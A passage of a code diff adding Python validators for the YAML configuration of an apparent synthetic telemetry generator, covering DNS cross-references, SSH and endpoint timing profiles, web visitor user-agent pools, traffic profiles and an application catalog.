+                    )
+    proxy_ua_hosts: set[str] = set()
+    if isinstance(proxy_ua_data.get("domain_overrides"), dict):
+        for override in proxy_ua_data.get("domain_overrides", {}).values():
+            if not isinstance(override, dict):
+                continue
+            proxy_ua_hosts.update(str(host) for host in override.get("hosts", []) if host)
+    for domain in proxy_ua_hosts - dns_domain_set:
+        result.issues.append(
+            Issue(
+                "WARNING",
+                "proxy_user_agents.yaml",
+                f'Domain override host "{domain}" not found in dns_registry',
+            )
+        )
+    ocsp_responder_hosts: set[str] = set()
+    for responder in tls_realism_data.get("ocsp", {}).get("responders", []):
+        if not isinstance(responder, dict):
+            continue
+        ocsp_responder_hosts.update(str(host) for host in responder.get("domains", []) if host)
+    for domain in ocsp_responder_hosts - dns_domain_set:
+        result.issues.append(
+            Issue(
+                "WARNING",
+                "tls_realism.yaml",
+                f'OCSP responder host "{domain}" not found in dns_registry',
+            )
+        )
+    return _DnsValidationState(
+        record_ids_rule_identity=_record_ids_rule_identity,
+        validate_ids_numeric_field=_validate_ids_numeric_field,
+        validate_ids_signature_predicate=_validate_ids_signature_predicate,
+        all_dns_tags=all_dns_tags,
+        dns_domain_set=dns_domain_set,
+        domains=domains,
+        proxy_domains=proxy_domains,
+        site_domains=site_domains,
+        site_referenced_hosts=site_referenced_hosts,
+    )
+
+
+def _validate_timing_profiles(
+    *,
+    dns_domain_set: set[str],
+    domains: list[dict[str, Any]],
+    proxy_domains: set[str],
+    result: ValidationResult,
+    site_domains: set[str],
+    site_referenced_hosts: set[str],
+    timing_profiles_data: dict[str, Any],
+) -> None:
+    """Validate timing profiles in the established diagnostic order."""
+    # --- Timing profile integrity ---
+    valid_timing_classes = {
+        "same_observation",
+        "source_latency",
+        "causal_prerequisite",
+        "human_workflow",
+        "burst_fanout",
+        "periodic",
+        "teardown",
+    }
+    relationships = timing_profiles_data.get("relationships", {})
+    if not isinstance(relationships, dict):
+        result.issues.append(
+            Issue("ERROR", "timing_profiles.yaml", "relationships must be a mapping")
+        )
+    else:
+        for rel_name, rel_data in relationships.items():
+            if not isinstance(rel_data, dict):
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "timing_profiles.yaml",
+                        f'Relationship "{rel_name}" must be a mapping',
+                    )
+                )
+                continue
+            rel_class = rel_data.get("class")
+            if rel_class not in valid_timing_classes:
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "timing_profiles.yaml",
+                        f'Relationship "{rel_name}" has invalid class "{rel_class}"',
+                    )
+                )
+            position = rel_data.get("position")
+            if position not in {"before", "after"}:
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "timing_profiles.yaml",
+                        f'Relationship "{rel_name}" has invalid position "{position}"',
+                    )
+                )
+            min_ms = rel_data.get("min_ms")
+            max_ms = rel_data.get("max_ms")
+            if not isinstance(min_ms, int) or min_ms < 0:
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "timing_profiles.yaml",
+                        f'Relationship "{rel_name}" min_ms must be a non-negative integer',
+                    )
+                )
+            if not isinstance(max_ms, int) or max_ms < 0:
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "timing_profiles.yaml",
+                        f'Relationship "{rel_name}" max_ms must be a non-negative integer',
+                    )
+                )
+            if isinstance(min_ms, int) and isinstance(max_ms, int) and max_ms < min_ms:
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "timing_profiles.yaml",
+                        f'Relationship "{rel_name}" max_ms must be greater than or equal to min_ms',
+                    )
+                )
+
+    ssh_authentication = timing_profiles_data.get("ssh_authentication", {})
+    if not isinstance(ssh_authentication, dict):
+        result.issues.append(
+            Issue("ERROR", "timing_profiles.yaml", "ssh_authentication must be a mapping")
+        )
+    else:
+        ssh_profiles = ssh_authentication.get("profiles")
+        if not isinstance(ssh_profiles, dict):
+            result.issues.append(
+                Issue(
+                    "ERROR",
+                    "timing_profiles.yaml",
+                    "ssh_authentication.profiles must be a mapping",
+                )
+            )
+            ssh_profiles = {}
+
+        def validate_ssh_range(path: str, value: object) -> None:
+            if not isinstance(value, dict):
+                result.issues.append(
+                    Issue("ERROR", "timing_profiles.yaml", f"{path} must be a mapping")
+                )
+                return
+            minimum = value.get("min")
+            maximum = value.get("max")
+            for bound_name, bound in (("min", minimum), ("max", maximum)):
+                if not isinstance(bound, int) or isinstance(bound, bool) or bound < 0:
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            "timing_profiles.yaml",
+                            f"{path}.{bound_name} must be a non-negative integer",
+                        )
+                    )
+            if (
+                isinstance(minimum, int)
+                and not isinstance(minimum, bool)
+                and isinstance(maximum, int)
+                and not isinstance(maximum, bool)
+                and maximum < minimum
+            ):
+                result.issues.append(
+                    Issue("ERROR", "timing_profiles.yaml", f"{path}.max must be >= min")
+                )
+
+        for method in ("publickey", "password"):
+            profile = ssh_profiles.get(method)
+            profile_path = f"ssh_authentication.profiles.{method}"
+            if not isinstance(profile, dict):
+                result.issues.append(
+                    Issue("ERROR", "timing_profiles.yaml", f"{profile_path} must be a mapping")
+                )
+                continue
+            probabilities: list[float] = []
+            for probability_name in (
+                "fast_probability",
+                "tail_probability",
+                "cache_miss_probability",
+            ):
+                probability = profile.get(probability_name)
+                if (
+                    not isinstance(probability, int | float)
+                    or isinstance(probability, bool)
+                    or not math.isfinite(float(probability))
+                    or not 0.0 <= float(probability) <= 1.0
+                ):
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            "timing_profiles.yaml",
+                            f"{profile_path}.{probability_name} must be finite and between 0 and 1",
+                        )
+                    )
+                else:
+                    probabilities.append(float(probability))
+            if len(probabilities) >= 2 and probabilities[0] + probabilities[1] > 1.0:
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "timing_profiles.yaml",
+                        f"{profile_path} fast_probability + tail_probability must be <= 1",
+                    )
+                )
+            for range_name in ("fast_ms", "typical_ms", "tail_ms", "cache_miss_ms"):
+                validate_ssh_range(f"{profile_path}.{range_name}", profile.get(range_name))
+
+        route_profiles = ssh_authentication.get("route_rtt_ms")
+        if not isinstance(route_profiles, dict):
+            result.issues.append(
+                Issue(
+                    "ERROR",
+                    "timing_profiles.yaml",
+                    "ssh_authentication.route_rtt_ms must be a mapping",
+                )
+            )
+        else:
+            for route_class in ("private", "public"):
+                validate_ssh_range(
+                    f"ssh_authentication.route_rtt_ms.{route_class}",
+                    route_profiles.get(route_class),
+                )
+        validate_ssh_range(
+            "ssh_authentication.receiver_load_ms",
+            ssh_authentication.get("receiver_load_ms"),
+        )
+        key_penalties = ssh_authentication.get("public_key_penalty_ms")
+        if not isinstance(key_penalties, dict):
+            result.issues.append(
+                Issue(
+                    "ERROR",
+                    "timing_profiles.yaml",
+                    "ssh_authentication.public_key_penalty_ms must be a mapping",
+                )
+            )
+        else:
+            for key_type, penalty in key_penalties.items():
+                validate_ssh_range(f"ssh_authentication.public_key_penalty_ms.{key_type}", penalty)
+
+    startup_module_timing = timing_profiles_data.get("windows_startup_modules", {})
+    if not isinstance(startup_module_timing, dict):
+        result.issues.append(
+            Issue(
+                "ERROR",
+                "timing_profiles.yaml",
+                "windows_startup_modules must be a mapping",
+            )
+        )
+    else:
+        initial_delay = startup_module_timing.get("initial_delay_us")
+        inter_load_gap = startup_module_timing.get("inter_load_gap_us")
+        for field_name, bounds in (
+            ("initial_delay_us", initial_delay),
+            ("inter_load_gap_us", inter_load_gap),
+        ):
+            if not isinstance(bounds, dict):
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "timing_profiles.yaml",
+                        f"windows_startup_modules.{field_name} must be a mapping",
+                    )
+                )
+                continue
+            min_value = bounds.get("min")
+            max_value = bounds.get("max")
+            if not isinstance(min_value, int) or isinstance(min_value, bool) or min_value <= 0:
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "timing_profiles.yaml",
+                        f"windows_startup_modules.{field_name}.min must be a positive integer",
+                    )
+                )
+            if not isinstance(max_value, int) or isinstance(max_value, bool) or max_value <= 0:
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "timing_profiles.yaml",
+                        f"windows_startup_modules.{field_name}.max must be a positive integer",
+                    )
+                )
+            if (
+                isinstance(min_value, int)
+                and not isinstance(min_value, bool)
+                and isinstance(max_value, int)
+                and not isinstance(max_value, bool)
+                and max_value < min_value
+            ):
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "timing_profiles.yaml",
+                        f"windows_startup_modules.{field_name}.max must be >= min",
+                    )
+                )
+        if isinstance(inter_load_gap, dict):
+            median = inter_load_gap.get("median")
+            sigma = inter_load_gap.get("sigma")
+            if not isinstance(median, int) or isinstance(median, bool) or median <= 0:
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "timing_profiles.yaml",
+                        "windows_startup_modules.inter_load_gap_us.median must be a positive integer",
+                    )
+                )
+            if (
+                not isinstance(sigma, int | float)
+                or isinstance(sigma, bool)
+                or not math.isfinite(float(sigma))
+                or not 0.05 <= float(sigma) <= 3.0
+            ):
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "timing_profiles.yaml",
+                        "windows_startup_modules.inter_load_gap_us.sigma must be finite and between 0.05 and 3.0",
+                    )
+                )
+            gap_min = inter_load_gap.get("min")
+            gap_max = inter_load_gap.get("max")
+            if (
+                isinstance(median, int)
+                and not isinstance(median, bool)
+                and isinstance(gap_min, int)
+                and not isinstance(gap_min, bool)
+                and isinstance(gap_max, int)
+                and not isinstance(gap_max, bool)
+                and not gap_min <= median <= gap_max
+            ):
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "timing_profiles.yaml",
+                        "windows_startup_modules.inter_load_gap_us.median must be within min/max",
+                    )
+                )
+
+    endpoint_clock = timing_profiles_data.get("endpoint_clock", {})
+    if not isinstance(endpoint_clock, dict):
+        result.issues.append(
+            Issue("ERROR", "timing_profiles.yaml", "endpoint_clock must be a mapping")
+        )
+    else:
+        profiles = endpoint_clock.get("profiles")
+        if not isinstance(profiles, dict) or not profiles:
+            result.issues.append(
+                Issue(
+                    "ERROR",
+                    "timing_profiles.yaml",
+                    "endpoint_clock.profiles must be a non-empty mapping",
+                )
+            )
+        elif "complete" not in profiles:
+            result.issues.append(
+                Issue(
+                    "ERROR",
+                    "timing_profiles.yaml",
+                    'endpoint_clock.profiles must include "complete"',
+                )
+            )
+        if isinstance(profiles, dict):
+            for profile_name, profile_data in profiles.items():
+                if not isinstance(profile_data, dict):
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            "timing_profiles.yaml",
+                            f'Endpoint clock profile "{profile_name}" must be a mapping',
+                        )
+                    )
+                    continue
+                for os_name in ("windows", "linux"):
+                    os_profile = profile_data.get(os_name)
+                    if not isinstance(os_profile, dict):
+                        result.issues.append(
+                            Issue(
+                                "ERROR",
+                                "timing_profiles.yaml",
+                                f"endpoint_clock.profiles.{profile_name}.{os_name} must be a mapping",
+                            )
+                        )
+                        continue
+                    for field_name, minimum, maximum in (
+                        ("host_offset_ms", -300_000, 300_000),
+                        ("host_drift_ppm", -500, 500),
+                    ):
+                        bounds = os_profile.get(field_name)
+                        if not isinstance(bounds, dict):
+                            result.issues.append(
+                                Issue(
+                                    "ERROR",
+                                    "timing_profiles.yaml",
+                                    "endpoint_clock.profiles."
+                                    f"{profile_name}.{os_name}.{field_name} must be a mapping",
+                                )
+                            )
+                            continue
+                        min_value = bounds.get("min")
+                        max_value = bounds.get("max")
+                        if not isinstance(min_value, int) or min_value < minimum:
+                            result.issues.append(
+                                Issue(
+                                    "ERROR",
+                                    "timing_profiles.yaml",
+                                    "endpoint_clock.profiles."
+                                    f"{profile_name}.{os_name}.{field_name}.min must be an integer >= {minimum}",
+                                )
+                            )
+                        if not isinstance(max_value, int) or max_value > maximum:
+                            result.issues.append(
+                                Issue(
+                                    "ERROR",
+                                    "timing_profiles.yaml",
+                                    "endpoint_clock.profiles."
+                                    f"{profile_name}.{os_name}.{field_name}.max must be an integer <= {maximum}",
+                                )
+                            )
+                        if (
+                            isinstance(min_value, int)
+                            and isinstance(max_value, int)
+                            and max_value < min_value
+                        ):
+                            result.issues.append(
+                                Issue(
+                                    "ERROR",
+                                    "timing_profiles.yaml",
+                                    "endpoint_clock.profiles."
+                                    f"{profile_name}.{os_name}.{field_name}.max must be >= min",
+                                )
+                            )
+    spacing = timing_profiles_data.get("windows_event_time", {}).get("collision_spacing", {})
+    if not isinstance(spacing, dict):
+        result.issues.append(
+            Issue(
+                "ERROR",
+                "timing_profiles.yaml",
+                "windows_event_time.collision_spacing must be a mapping",
+            )
+        )
+    else:
+        _spacing_minimums = {
+            "near_zero_until": 0,
+            "near_gap_min_us": 1,
+            "near_gap_max_us": 1,
+            "large_gap_min_ms": 1,
+            "large_gap_max_ms": 1,
+        }
+        for field_name, minimum in _spacing_minimums.items():
+            value = spacing.get(field_name)
+            if not isinstance(value, int) or value < minimum:
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "timing_profiles.yaml",
+                        f"windows_event_time.collision_spacing.{field_name} must be an integer >= {minimum}",
+                    )
+                )
+        if (
+            isinstance(spacing.get("near_gap_min_us"), int)
+            and isinstance(spacing.get("near_gap_max_us"), int)
+            and spacing["near_gap_max_us"] < spacing["near_gap_min_us"]
+        ):
+            result.issues.append(
+                Issue(
+                    "ERROR",
+                    "timing_profiles.yaml",
+                    "windows_event_time.collision_spacing.near_gap_max_us must be >= near_gap_min_us",
+                )
+            )
+        if (
+            isinstance(spacing.get("large_gap_min_ms"), int)
+            and isinstance(spacing.get("large_gap_max_ms"), int)
+            and spacing["large_gap_max_ms"] < spacing["large_gap_min_ms"]
+        ):
+            result.issues.append(
+                Issue(
+                    "ERROR",
+                    "timing_profiles.yaml",
+                    "windows_event_time.collision_spacing.large_gap_max_ms must be >= large_gap_min_ms",
+                )
+            )
+
+    sensor_timing = timing_profiles_data.get("network_sensor_observation", {})
+    if not isinstance(sensor_timing, dict):
+        result.issues.append(
+            Issue("ERROR", "timing_profiles.yaml", "network_sensor_observation must be a mapping")
+        )
+    else:
+        default_profile = sensor_timing.get("default_profile")
+        profiles = sensor_timing.get("profiles")
+        if not isinstance(default_profile, str) or not default_profile:
+            result.issues.append(
+                Issue(
+                    "ERROR",
+                    "timing_profiles.yaml",
+                    "network_sensor_observation.default_profile must be a non-empty string",
+                )
+            )
+        if not isinstance(profiles, dict) or not profiles:
+            result.issues.append(
+                Issue(
+                    "ERROR",
+                    "timing_profiles.yaml",
+                    "network_sensor_observation.profiles must be a non-empty mapping",
+                )
+            )
+        elif isinstance(default_profile, str) and default_profile not in profiles:
+            result.issues.append(
+                Issue(
+                    "ERROR",
+                    "timing_profiles.yaml",
+                    f'network_sensor_observation.default_profile "{default_profile}" is not defined',
+                )
+            )
+        if isinstance(profiles, dict):
+            for profile_name, profile_data in profiles.items():
+                if not isinstance(profile_data, dict):
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            "timing_profiles.yaml",
+                            f'Network sensor profile "{profile_name}" must be a mapping',
+                        )
+                    )
+                    continue
+                sensor_ranges = {
+                    "clock_offset_us": (-1_000_000, "clock_skew_us", True),
+                    "clock_drift_ppm": (-500, None, False),
+                    "route_delay_us": (0, "path_delay_us", True),
+                    "event_jitter_us": (-1_000_000, None, False),
+                }
+                for field_name, (minimum, legacy_name, required) in sensor_ranges.items():
+                    bounds = profile_data.get(field_name)
+                    if bounds is None and legacy_name is not None:
+                        bounds = profile_data.get(legacy_name)
+                    if bounds is None and not required:
+                        continue
+                    if not isinstance(bounds, dict):
+                        result.issues.append(
+                            Issue(
+                                "ERROR",
+                                "timing_profiles.yaml",
+                                f"network_sensor_observation.profiles.{profile_name}.{field_name} must be a mapping",
+                            )
+                        )
+                        continue
+                    min_value = bounds.get("min")
+                    max_value = bounds.get("max")
+                    if not isinstance(min_value, int) or min_value < minimum:
+                        result.issues.append(
+                            Issue(
+                                "ERROR",
+                                "timing_profiles.yaml",
+                                f"network_sensor_observation.profiles.{profile_name}.{field_name}.min must be an integer >= {minimum}",
+                            )
+                        )
+                    if not isinstance(max_value, int) or max_value > 1_000_000:
+                        result.issues.append(
+                            Issue(
+                                "ERROR",
+                                "timing_profiles.yaml",
+                                f"network_sensor_observation.profiles.{profile_name}.{field_name}.max must be an integer <= 1000000",
+                            )
+                        )
+                    if (
+                        isinstance(min_value, int)
+                        and isinstance(max_value, int)
+                        and max_value < min_value
+                    ):
+                        result.issues.append(
+                            Issue(
+                                "ERROR",
+                                "timing_profiles.yaml",
+                                f"network_sensor_observation.profiles.{profile_name}.{field_name}.max must be >= min",
+                            )
+                        )
+                capture_loss = profile_data.get("capture_loss")
+                if capture_loss is not None and not isinstance(capture_loss, dict):
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            "timing_profiles.yaml",
+                            f"network_sensor_observation.profiles.{profile_name}.capture_loss must be a mapping",
+                        )
+                    )
+                elif isinstance(capture_loss, dict):
+                    for probability_field in ("probability", "min_fraction", "max_fraction"):
+                        value = capture_loss.get(probability_field, 0.0)
+                        if (
+                            not isinstance(value, (int, float))
+                            or isinstance(value, bool)
+                            or not 0.0 <= float(value) <= 1.0
+                        ):
+                            result.issues.append(
+                                Issue(
+                                    "ERROR",
+                                    "timing_profiles.yaml",
+                                    f"network_sensor_observation.profiles.{profile_name}.capture_loss.{probability_field} must be between 0 and 1",
+                                )
+                            )
+                    max_missed = capture_loss.get("max_missed_bytes", 0)
+                    if not isinstance(max_missed, int) or max_missed < 0:
+                        result.issues.append(
+                            Issue(
+                                "ERROR",
+                                "timing_profiles.yaml",
+                                f"network_sensor_observation.profiles.{profile_name}.capture_loss.max_missed_bytes must be an integer >= 0",
+                            )
+                        )
+
+    # Check 8: Orphaned site maps
+    for domain in site_domains - dns_domain_set:
+        result.issues.append(
+            Issue("WARNING", "site_maps.yaml", f'Domain "{domain}" not found in dns_registry')
+        )
+    for domain in site_referenced_hosts - dns_domain_set:
+        result.issues.append(
+            Issue(
+                "WARNING",
+                "site_maps.yaml",
+                f'Referenced host "{domain}" not found in dns_registry',
+            )
+        )
+
+    # Checks 9-10: Missing proxy templates / site maps for web/saas domains
+    web_saas_domains = {
+        entry["domain"] for entry in domains if set(entry.get("tags", [])) & {"web", "saas"}
+    }
+    for domain in web_saas_domains - proxy_domains:
+        result.issues.append(
+            Issue(
+                "INFO",
+                "dns_registry.yaml",
+                f'Domain "{domain}" (web/saas) has no proxy_uri_templates entry',
+            )
+        )
+
+    for domain in web_saas_domains - site_domains:
+        result.issues.append(
+            Issue(
+                "INFO", "dns_registry.yaml", f'Domain "{domain}" (web/saas) has no site_maps entry'
+            )
+        )
+
+
+def _validate_web_profiles(
+    *,
+    is_safe_http_header_value: Callable[[str], bool],
+    is_safe_http_method: Callable[[str], bool],
+    is_safe_http_path: Callable[[str], bool],
+    is_safe_mime_type: Callable[[str], bool],
+    result: ValidationResult,
+    web_session_profiles_data: dict[str, Any],
+) -> None:
+    """Validate web profiles in the established diagnostic order."""
+    # --- Inbound web visitor profile integrity ---
+    web_visitor_classes = web_session_profiles_data.get("visitor_classes", {})
+    web_ua_pools = web_session_profiles_data.get("user_agent_pools", {})
+    if not isinstance(web_visitor_classes, dict) or not web_visitor_classes:
+        result.issues.append(
+            Issue("ERROR", "web_session_profiles.yaml", "visitor_classes must be a mapping")
+        )
+    if not isinstance(web_ua_pools, dict) or not web_ua_pools:
+        result.issues.append(
+            Issue("ERROR", "web_session_profiles.yaml", "user_agent_pools must be a mapping")
+        )
+    if isinstance(web_ua_pools, dict):
+        for pool_name, user_agents in web_ua_pools.items():
+            if not isinstance(user_agents, list) or not user_agents:
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "web_session_profiles.yaml",
+                        f'User-Agent pool "{pool_name}" must be a non-empty list',
+                    )
+                )
+                continue
+            for index, user_agent in enumerate(user_agents):
+                if not is_safe_http_header_value(user_agent):
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            "web_session_profiles.yaml",
+                            f'User-Agent pool "{pool_name}" entry {index} must be a non-empty single-line string',
+                        )
+                    )
+    if isinstance(web_visitor_classes, dict) and isinstance(web_ua_pools, dict):
+        for class_name, class_data in web_visitor_classes.items():
+            if not isinstance(class_data, dict):
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "web_session_profiles.yaml",
+                        f'Visitor class "{class_name}" must be a mapping',
+                    )
+                )
+                continue
+            if class_data.get("kind") not in {"session", "requests"}:
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "web_session_profiles.yaml",
+                        f'Visitor class "{class_name}" kind must be "session" or "requests"',
+                    )
+                )
+            weight = class_data.get("weight")
+            if not isinstance(weight, int | float) or isinstance(weight, bool) or weight <= 0:
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "web_session_profiles.yaml",
+                        f'Visitor class "{class_name}" weight must be positive',
+                    )
+                )
+            pool_name = class_data.get("user_agent_pool")
+            if not isinstance(pool_name, str) or pool_name not in web_ua_pools:
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "web_session_profiles.yaml",
+                        f'Visitor class "{class_name}" references missing user_agent_pool "{pool_name}"',
+                    )
+                )
+            referenced_pool_names = {pool_name} if isinstance(pool_name, str) else set()
+            by_os = class_data.get("user_agent_pool_by_os")
+            if by_os is not None and not isinstance(by_os, dict):
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "web_session_profiles.yaml",
+                        f'Visitor class "{class_name}" user_agent_pool_by_os must be a mapping',
+                    )
+                )
+            if isinstance(by_os, dict):
+                for os_name, os_pool in by_os.items():
+                    if not isinstance(os_name, str) or not isinstance(os_pool, str):
+                        result.issues.append(
+                            Issue(
+                                "ERROR",
+                                "web_session_profiles.yaml",
+                                f'Visitor class "{class_name}" user_agent_pool_by_os must map strings to strings',
+                            )
+                        )
+                        continue
+                    if os_pool not in web_ua_pools:
+                        result.issues.append(
+                            Issue(
+                                "ERROR",
+                                "web_session_profiles.yaml",
+                                f'Visitor class "{class_name}" references missing OS user_agent_pool "{os_pool}"',
+                            )
+                        )
+                    else:
+                        referenced_pool_names.add(os_pool)
+            role_values = class_data.get("source_role_any")
+            source_roles = (
+                {str(role).lower() for role in role_values}
+                if isinstance(role_values, list)
+                else set()
+            )
+            kube_roles = {"kubernetes", "k8s", "kubelet", "container", "container_runtime"}
+            if class_name == "health_check" and not source_roles & kube_roles:
+                for referenced_pool_name in sorted(referenced_pool_names):
+                    user_agents = web_ua_pools.get(referenced_pool_name)
+                    if not isinstance(user_agents, list):
+                        continue
+                    for user_agent in user_agents:
+                        if isinstance(user_agent, str) and "kube-probe" in user_agent.lower():
+                            result.issues.append(
+                                Issue(
+                                    "ERROR",
+                                    "web_session_profiles.yaml",
+                                    'Visitor class "health_check" may use kube-probe only with '
+                                    "a Kubernetes-scoped source_role_any",
+                                )
+                            )
+            if class_data.get("kind") == "requests":
+                request_count = class_data.get("request_count")
+                if (
+                    not isinstance(request_count, list)
+                    or len(request_count) != 2
+                    or not all(isinstance(value, int) and value > 0 for value in request_count)
+                    or request_count[1] < request_count[0]
+                ):
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            "web_session_profiles.yaml",
+                            f'Visitor class "{class_name}" request_count must be [min, max] positive integers',
+                        )
+                    )
+                requests = class_data.get("requests")
+                if not isinstance(requests, list) or not requests:
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            "web_session_profiles.yaml",
+                            f'Visitor class "{class_name}" requests must be a non-empty list',
+                        )
+                    )
+                    continue
+                for index, request in enumerate(requests):
+                    if not isinstance(request, dict):
+                        result.issues.append(
+                            Issue(
+                                "ERROR",
+                                "web_session_profiles.yaml",
+                                f'Visitor class "{class_name}" request {index} must be a mapping',
+                            )
+                        )
+                        continue
+                    for required in ("path", "method", "status", "type"):
+                        if required not in request:
+                            result.issues.append(
+                                Issue(
+                                    "ERROR",
+                                    "web_session_profiles.yaml",
+                                    f'Visitor class "{class_name}" request {index} missing "{required}"',
+                                )
+                            )
+                    if not is_safe_http_path(request.get("path")):
+                        result.issues.append(
+                            Issue(
+                                "ERROR",
+                                "web_session_profiles.yaml",
+                                f'Visitor class "{class_name}" request {index} path must be a single-line path starting with "/"',
+                            )
+                        )
+                    if not is_safe_http_method(request.get("method")):
+                        result.issues.append(
+                            Issue(
+                                "ERROR",
+                                "web_session_profiles.yaml",
+                                f'Visitor class "{class_name}" request {index} method must be a supported single-line HTTP method',
+                            )
+                        )
+                    status = request.get("status")
+                    if (
+                        not isinstance(status, int)
+                        or isinstance(status, bool)
+                        or not 100 <= status <= 599
+                    ):
+                        result.issues.append(
+                            Issue(
+                                "ERROR",
+                                "web_session_profiles.yaml",
+                                f'Visitor class "{class_name}" request {index} status must be an integer from 100 to 599',
+                            )
+                        )
+                    if not is_safe_mime_type(request.get("type")):
+                        result.issues.append(
+                            Issue(
+                                "ERROR",
+                                "web_session_profiles.yaml",
+                                f'Visitor class "{class_name}" request {index} type must be a single-line MIME type',
+                            )
+                        )
+
+
+def _validate_traffic_profiles(
+    *,
+    all_dns_tags: set[str],
+    personas_dir: Path,
+    process_net_data: dict[str, Any],
+    result: ValidationResult,
+    tls_realism_data: dict[str, Any],
+    traffic_data: dict[str, Any],
+) -> tuple[list[dict[str, Any]], set[str], dict[str, Any]]:
+    """Validate traffic profiles in the established diagnostic order."""
+    # --- Checks 11-13: Traffic Profile Integrity ---
+    role_traffic = traffic_data.get("role_traffic", {})
+    persona_traffic = traffic_data.get("persona_traffic", {})
+
+    # Collect all dns_tags used in traffic profiles
+    all_traffic_entries = []
+    for _role_name, role_data in role_traffic.items():
+        for direction in ["outbound", "inbound"]:
+            entries = role_data.get(direction, []) if isinstance(role_data, dict) else []
+            all_traffic_entries.extend(entries)
+    for _persona_name, persona_entries in persona_traffic.items():
+        if isinstance(persona_entries, dict):
+            for direction in ["outbound", "inbound"]:
+                all_traffic_entries.extend(persona_entries.get(direction, []))
+        elif isinstance(persona_entries, list):
+            all_traffic_entries.extend(persona_entries)
+
+    # Check 11: Orphaned dns_tags
+    for entry in all_traffic_entries:
+        for tag in entry.get("dns_tags", []):
+            if tag not in all_dns_tags:
+                result.issues.append(
+                    Issue(
+                        "WARNING",
+                        "traffic_profiles.yaml",
+                        f'dns_tag "{tag}" not used by any domain in dns_registry',
+                    )
+                )
+    for entry in process_net_data:
+        for tag in entry.get("dns_tags", []):
+            if tag not in all_dns_tags:
+                result.issues.append(
+                    Issue(
+                        "WARNING",
+                        "process_network_map.yaml",
+                        f'dns_tag "{tag}" not used by any domain in dns_registry',
+                    )
+                )
+    tls_destination_profiles = tls_realism_data.get("destinations", {}).get("profiles", [])
+    for profile in tls_destination_profiles:
+        for tag in profile.get("dns_tags", []):
+            if tag not in all_dns_tags:
+                result.issues.append(
+                    Issue(
+                        "WARNING",
+                        "tls_realism.yaml",
+                        f'tls destination profile "{profile.get("name", "")}" references '
+                        f'dns_tag "{tag}" not used by any domain in dns_registry',
+                    )
+                )
+        for override in profile.get("os_overrides", {}).values():
+            if not isinstance(override, dict):
+                continue
+            for tag in override.get("dns_tags", []):
+                if tag not in all_dns_tags:
+                    result.issues.append(
+                        Issue(
+                            "WARNING",
+                            "tls_realism.yaml",
+                            f'tls destination profile "{profile.get("name", "")}" references '
+                            f'override dns_tag "{tag}" not used by any domain in dns_registry',
+                        )
+                    )
+
+    # Check 12: Orphaned persona_traffic keys
+    persona_names = _get_persona_names(personas_dir)
+    for persona_name in persona_traffic:
+        if persona_name not in persona_names and not persona_name.startswith("_"):
+            result.issues.append(
+                Issue(
+                    "WARNING",
+                    "traffic_profiles.yaml",
+                    f'persona_traffic key "{persona_name}" has no matching persona file',
+                )
+            )
+
+    # Check 13: Missing required fields in connection entries
+    for entry in all_traffic_entries:
+        for field_name in ["role", "port", "weight"]:
+            if field_name not in entry and entry.get("proto") != "icmp":
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "traffic_profiles.yaml",
+                        f"Connection entry missing required field: {field_name}",
+                    )
+                )
+    return all_traffic_entries, persona_names, persona_traffic
+
+
+def _validate_applications(
+    *,
+    catalog_data: dict[str, Any],
+    persona_names: set[str],
+    result: ValidationResult,
+) -> list[dict[str, Any]]:
+    """Validate applications in the established diagnostic order."""
+    # --- Checks 14-17: Application Catalog Integrity ---
+    apps = catalog_data.get("applications", [])
+    seen_app_ids: set[str] = set()
+    all_app_ids: set[str] = set()
+
+    for app in apps:
+        app_id = app.get("id", "")
+
+        # Check 14: Duplicate app IDs
+        if app_id in seen_app_ids:
+            result.issues.append(
+                Issue("ERROR", "application_catalog.yaml", f'Duplicate app id "{app_id}"')
+            )
+        seen_app_ids.add(app_id)
+        all_app_ids.add(app_id)
+
+        # Check 15: Orphaned persona references
+        for persona in app.get("personas", []):
+            if persona not in persona_names and persona != "default":
+                result.issues.append(
+                    Issue(
+                        "WARNING",
+                        "application_catalog.yaml",
+                        f'App "{app_id}" references persona "{persona}" with no matching file',
+                    )
+                )
+
+        # Check: system_types values are valid
+        _VALID_SYSTEM_TYPES = {"workstation", "server", "domain_controller"}
+        for st in app.get("system_types", []):
+            if st not in _VALID_SYSTEM_TYPES:
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "application_catalog.yaml",
+                        f'App "{app_id}" has invalid system_type "{st}" (valid: {sorted(_VALID_SYSTEM_TYPES)})',
+                    )
+                )
+
+        # Check 16-17: Image paths
+        for os_name, platform in app.get("platforms", {}).items():
+            image_path = platform.get("image_path", "")
+            if not image_path:
+                # Check 16: Missing image path
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "application_catalog.yaml",
+                        f'App "{app_id}" missing image_path for {os_name}',
+                    )
+                )
+            elif "/" not in image_path and "\\" not in image_path:
+                # Check 17: Bare filename
+                result.issues.append(
